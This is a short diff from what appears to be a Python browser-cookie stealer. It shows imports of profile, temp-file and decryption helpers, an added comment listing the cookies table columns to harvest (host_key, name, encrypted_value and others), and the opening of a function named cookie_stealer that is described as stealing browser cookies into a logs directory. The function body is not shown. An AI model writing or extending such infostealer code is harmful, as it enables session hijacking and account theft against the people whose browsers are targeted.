@@ -4,6 +4,13 @@ import sqlite3
 from util import get_profiles, create_temp_file, create_log_file, try_decrypt
 
 
+"""
+Tables of interest from SQLi Recon:
+- cookies: contains all the cookie data
+    - Columns of interest: host_key, path, name, encrypted_value, expires_utc
+"""
+
+
 def cookie_stealer(browser: dict, encryption_key: str) -> None:
     """ Steals cookies from a browser and places them into the logs directory """
     # Examine each profile
